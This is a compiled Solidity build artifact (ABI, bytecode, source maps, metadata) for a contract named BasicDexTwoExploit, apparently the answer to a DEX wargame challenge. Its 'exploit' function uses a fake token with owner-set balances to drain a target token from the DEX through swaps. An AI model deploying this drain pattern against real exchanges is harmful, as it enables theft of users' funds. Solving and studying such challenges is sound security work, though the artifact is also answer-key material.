{"abi":[{"type":"constructor","inputs":[{"name":"_dexTwo","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"approve","inputs":[{"name":"spender","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"},{"type":"function","name":"balanceOf","inputs":[{"name":"account","type":"address","internalType":"address"}],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"balanceToReturn","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"dexTwo","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"exploit","inputs":[{"name":"tokenToDrain","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"setBalance","inputs":[{"name":"_balance","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"transfer","inputs":[{"name":"to","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"},{"type":"function","name":"transferFrom","inputs":[{"name":"from","type":"address","internalType":"address"},{"name":"to","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052600180553480156012575f5ffd5b50604051610653380380610653833981016040819052602f91605b565b5f80546001600160a01b039092166001600160a01b031992831617905560028054909116331790556086565b5f60208284031215606a575f5ffd5b81516001600160a01b0381168114607f575f5ffd5b9392505050565b6105c0806100935f395ff3fe608060405234801561000f575f5ffd5b506004361061009f575f3560e01c806367df3a08116100725780638da5cb5b116100585780638da5cb5b1461014e578063a9059cbb146100a3578063fb1669ca14610161575f5ffd5b806367df3a081461012457806370a082311461013b575f5ffd5b8063095ea7b3146100a35780630aeb4ddf146100ce57806323b872dd146100e3578063396b1600146100fa575b5f5ffd5b6100b96100b13660046104ae565b600192915050565b60405190151581526020015b60405180910390f35b6100e16100dc3660046104d6565b610174565b005b6100b96100f13660046104f6565b60019392505050565b5f5461010c906001600160a01b031681565b6040516001600160a01b0390911681526020016100c5565b61012d60015481565b6040519081526020016100c5565b61012d6101493660046104d6565b610411565b60025461010c906001600160a01b031681565b6100e161016f366004610530565b610447565b6002546001600160a01b031633146101c05760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b60448201526064015b60405180910390fd5b5f80546040516001600160a01b039182166024820152829184169060440160408051601f198184030181529181526020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167f70a0823100000000000000000000000000000000000000000000000000000000179052516102419190610547565b5f60405180830381855afa9150503d805f8114610279576040519150601f19603f3d011682016040523d82523d5f602084013e61027e565b606091505b5091509150816102d05760405162461bcd60e51b815260206004820152601560248201527f4661696c656420746f206765742062616c616e6365000000000000000000000060448201526064016101b7565b5f818060200190518101906102e59190610573565b9050801561040b575f80546040513060248201526001600160a01b038781166044830152606482018590529091169060840160408051601f198184030181529181526020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167fdf791e50000000000000000000000000000000000000000000000000000000001790525161037a9190610547565b5f604051808303815f865af19150503d805f81146103b3576040519150601f19603f3d011682016040523d82523d5f602084013e6103b8565b606091505b50509050806104095760405162461bcd60e51b815260206004820152600b60248201527f53776170206661696c656400000000000000000000000000000000000000000060448201526064016101b7565b505b50505050565b5f80546001600160a01b03163303610440575f546001600160a01b039081169083160361044057505060015490565b505f919050565b6002546001600160a01b0316331461048e5760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b60448201526064016101b7565b600155565b80356001600160a01b03811681146104a9575f5ffd5b919050565b5f5f604083850312156104bf575f5ffd5b6104c883610493565b946020939093013593505050565b5f602082840312156104e6575f5ffd5b6104ef82610493565b9392505050565b5f5f5f60608486031215610508575f5ffd5b61051184610493565b925061051f60208501610493565b929592945050506040919091013590565b5f60208284031215610540575f5ffd5b5035919050565b5f82515f5b81811015610566576020818601810151858301520161054c565b505f920191825250919050565b5f60208284031215610583575f5ffd5b505191905056fea2646970667358221220d95cfe2f4b0ae0cb15e293382d0bb4d1d2009ad6f9ce7fc716f5c6a465ebb01764736f6c634300081c0033","sourceMap":"57:2153:0:-:0;;;944:1;911:34;;982:90;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1021:6;:16;;-1:-1:-1;;;;;1021:16:0;;;-1:-1:-1;;;;;;1021:16:0;;;;;;1047:5;:18;;;;;1055:10;1047:18;;;57:2153;;14:290:1;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:1;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:1:o;:::-;57:2153:0;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405234801561000f575f5ffd5b506004361061009f575f3560e01c806367df3a08116100725780638da5cb5b116100585780638da5cb5b1461014e578063a9059cbb146100a3578063fb1669ca14610161575f5ffd5b806367df3a081461012457806370a082311461013b575f5ffd5b8063095ea7b3146100a35780630aeb4ddf146100ce57806323b872dd146100e3578063396b1600146100fa575b5f5ffd5b6100b96100b13660046104ae565b600192915050565b60405190151581526020015b60405180910390f35b6100e16100dc3660046104d6565b610174565b005b6100b96100f13660046104f6565b60019392505050565b5f5461010c906001600160a01b031681565b6040516001600160a01b0390911681526020016100c5565b61012d60015481565b6040519081526020016100c5565b61012d6101493660046104d6565b610411565b60025461010c906001600160a01b031681565b6100e161016f366004610530565b610447565b6002546001600160a01b031633146101c05760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b60448201526064015b60405180910390fd5b5f80546040516001600160a01b039182166024820152829184169060440160408051601f198184030181529181526020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167f70a0823100000000000000000000000000000000000000000000000000000000179052516102419190610547565b5f60405180830381855afa9150503d805f8114610279576040519150601f19603f3d011682016040523d82523d5f602084013e61027e565b606091505b5091509150816102d05760405162461bcd60e51b815260206004820152601560248201527f4661696c656420746f206765742062616c616e6365000000000000000000000060448201526064016101b7565b5f818060200190518101906102e59190610573565b9050801561040b575f80546040513060248201526001600160a01b038781166044830152606482018590529091169060840160408051601f198184030181529181526020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167fdf791e50000000000000000000000000000000000000000000000000000000001790525161037a9190610547565b5f604051808303815f865af19150503d805f81146103b3576040519150601f19603f3d011682016040523d82523d5f602084013e6103b8565b606091505b50509050806104095760405162461bcd60e51b815260206004820152600b60248201527f53776170206661696c656400000000000000000000000000000000000000000060448201526064016101b7565b505b50505050565b5f80546001600160a01b03163303610440575f546001600160a01b039081169083160361044057505060015490565b505f919050565b6002546001600160a01b0316331461048e5760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b60448201526064016101b7565b600155565b80356001600160a01b03811681146104a9575f5ffd5b919050565b5f5f604083850312156104bf575f5ffd5b6104c883610493565b946020939093013593505050565b5f602082840312156104e6575f5ffd5b6104ef82610493565b9392505050565b5f5f5f60608486031215610508575f5ffd5b61051184610493565b925061051f60208501610493565b929592945050506040919091013590565b5f60208284031215610540575f5ffd5b5035919050565b5f82515f5b81811015610566576020818601810151858301520161054c565b505f920191825250919050565b5f60208284031215610583575f5ffd5b505191905056fea2646970667358221220d95cfe2f4b0ae0cb15e293382d0bb4d1d2009ad6f9ce7fc716f5c6a465ebb01764736f6c634300081c0033","sourceMap":"57:2153:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;746:128;;;;;;:::i;:::-;863:4;746:128;;;;;;;;685:14:1;;678:22;660:41;;648:2;633:18;746:128:0;;;;;;;;1257:951;;;;;;:::i;:::-;;:::i;:::-;;460:142;;;;;;:::i;:::-;591:4;460:142;;;;;;884:21;;;;;-1:-1:-1;;;;;884:21:0;;;;;;-1:-1:-1;;;;;1446:55:1;;;1428:74;;1416:2;1401:18;884:21:0;1282:226:1;911:34:0;;;;;;;;;1659:25:1;;;1647:2;1632:18;911:34:0;1513:177:1;114:336:0;;;;;;:::i;:::-;;:::i;951:20::-;;;;;-1:-1:-1;;;;;951:20:0;;;1082:142;;;;;;:::i;:::-;;:::i;1257:951::-;1337:5;;-1:-1:-1;;;;;1337:5:0;1323:10;:19;1315:42;;;;-1:-1:-1;;;1315:42:0;;2128:2:1;1315:42:0;;;2110:21:1;2167:2;2147:18;;;2140:30;-1:-1:-1;;;2186:18:1;;;2179:40;2236:18;;1315:42:0;;;;;;;;;1431:12;1549:6;;1503:53;;-1:-1:-1;;;;;1549:6:0;;;1503:53;;;1428:74:1;1431:12:0;;1466:23;;;1401:18:1;;1503:53:0;;;-1:-1:-1;;1503:53:0;;;;;;;;;;;;;;;;;;;;1466:100;;;1503:53;1466:100;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1430:136;;;;1584:7;1576:41;;;;-1:-1:-1;;;1576:41:0;;2884:2:1;1576:41:0;;;2866:21:1;2923:2;2903:18;;;2896:30;2962:23;2942:18;;;2935:51;3003:18;;1576:41:0;2682:345:1;1576:41:0;1627:18;1659:4;1648:27;;;;;;;;;;;;:::i;:::-;1627:48;-1:-1:-1;1698:14:0;;1694:508;;1811:16;1832:6;;1861:267;;1967:4;1861:267;;;3423:74:1;-1:-1:-1;;;;;3533:55:1;;;3513:18;;;3506:83;3605:18;;;3598:34;;;1832:6:0;;;;3396:18:1;;1861:267:0;;;-1:-1:-1;;1861:267:0;;;;;;;;;;;;;;;;;;;;1832:310;;;1861:267;1832:310;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1810:332;;;2164:11;2156:35;;;;-1:-1:-1;;;2156:35:0;;3845:2:1;2156:35:0;;;3827:21:1;3884:2;3864:18;;;3857:30;3923:13;3903:18;;;3896:41;3954:18;;2156:35:0;3643:335:1;2156:35:0;1714:488;1694:508;1305:903;;;1257:951;:::o;114:336::-;173:7;257:6;;-1:-1:-1;;;;;257:6:0;243:10;:20;239:187;;294:6;;-1:-1:-1;;;;;294:6:0;;;283:17;;;;279:137;;-1:-1:-1;;386:15:0;;;114:336::o;279:137::-;-1:-1:-1;442:1:0;;114:336;-1:-1:-1;114:336:0:o;1082:142::-;1161:5;;-1:-1:-1;;;;;1161:5:0;1147:10;:19;1139:42;;;;-1:-1:-1;;;1139:42:0;;2128:2:1;1139:42:0;;;2110:21:1;2167:2;2147:18;;;2140:30;-1:-1:-1;;;2186:18:1;;;2179:40;2236:18;;1139:42:0;1926:334:1;1139:42:0;1191:15;:26;1082:142::o;14:196:1:-;82:20;;-1:-1:-1;;;;;131:54:1;;121:65;;111:93;;200:1;197;190:12;111:93;14:196;;;:::o;215:300::-;283:6;291;344:2;332:9;323:7;319:23;315:32;312:52;;;360:1;357;350:12;312:52;383:29;402:9;383:29;:::i;:::-;373:39;481:2;466:18;;;;453:32;;-1:-1:-1;;;215:300:1:o;712:186::-;771:6;824:2;812:9;803:7;799:23;795:32;792:52;;;840:1;837;830:12;792:52;863:29;882:9;863:29;:::i;:::-;853:39;712:186;-1:-1:-1;;;712:186:1:o;903:374::-;980:6;988;996;1049:2;1037:9;1028:7;1024:23;1020:32;1017:52;;;1065:1;1062;1055:12;1017:52;1088:29;1107:9;1088:29;:::i;:::-;1078:39;;1136:38;1170:2;1159:9;1155:18;1136:38;:::i;:::-;903:374;;1126:48;;-1:-1:-1;;;1243:2:1;1228:18;;;;1215:32;;903:374::o;1695:226::-;1754:6;1807:2;1795:9;1786:7;1782:23;1778:32;1775:52;;;1823:1;1820;1813:12;1775:52;-1:-1:-1;1868:23:1;;1695:226;-1:-1:-1;1695:226:1:o;2265:412::-;2394:3;2432:6;2426:13;2457:1;2467:129;2481:6;2478:1;2475:13;2467:129;;;2579:4;2563:14;;;2559:25;;2553:32;2540:11;;;2533:53;2496:12;2467:129;;;-1:-1:-1;2651:1:1;2615:16;;2640:13;;;-1:-1:-1;2615:16:1;2265:412;-1:-1:-1;2265:412:1:o;3032:184::-;3102:6;3155:2;3143:9;3134:7;3130:23;3126:32;3123:52;;;3171:1;3168;3161:12;3123:52;-1:-1:-1;3194:16:1;;3032:184;-1:-1:-1;3032:184:1:o","linkReferences":{}},"methodIdentifiers":{"approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","balanceToReturn()":"67df3a08","dexTwo()":"396b1600","exploit(address)":"0aeb4ddf","owner()":"8da5cb5b","setBalance(uint256)":"fb1669ca","transfer(address,uint256)":"a9059cbb","transferFrom(address,address,uint256)":"23b872dd"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_dexTwo\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"balanceToReturn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dexTwo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenToDrain\",\"type\":\"address\"}],\"name\":\"exploit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_balance\",\"type\":\"uint256\"}],\"name\":\"setBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/answers/BasicDexTwoExploit.sol\":\"BasicDexTwoExploit\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"src/answers/BasicDexTwoExploit.sol\":{\"keccak256\":\"0xfcfcf32520b0f8e89c10c54a9010689c069b1f856410f3b3c6b03b3fcb132f3e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://323424277ee4a78db0cb0b8a7d1e0744f4e362ec32d027839ecdc7ba0a39a067\",\"dweb:/ipfs/QmWNstWAnxsCiwPfDjbcytH1v6YMPmSKhQ7ShHBq8XkA6J\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.28+commit.7893614a"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"_dexTwo","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"stateMutability":"view","type":"function","name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"balanceToReturn","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"dexTwo","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[{"internalType":"address","name":"tokenToDrain","type":"address"}],"stateMutability":"nonpayable","type":"function","name":"exploit"},{"inputs":[],"stateMutability":"view","type":"function","name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[{"internalType":"uint256","name":"_balance","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"setBalance"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}]}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/answers/BasicDexTwoExploit.sol":"BasicDexTwoExploit"},"evmVersion":"shanghai","libraries":{}},"sources":{"src/answers/BasicDexTwoExploit.sol":{"keccak256":"0xfcfcf32520b0f8e89c10c54a9010689c069b1f856410f3b3c6b03b3fcb132f3e","urls":["bzz-raw://323424277ee4a78db0cb0b8a7d1e0744f4e362ec32d027839ecdc7ba0a39a067","dweb:/ipfs/QmWNstWAnxsCiwPfDjbcytH1v6YMPmSKhQ7ShHBq8XkA6J"],"license":"MIT"}},"version":1},"id":0}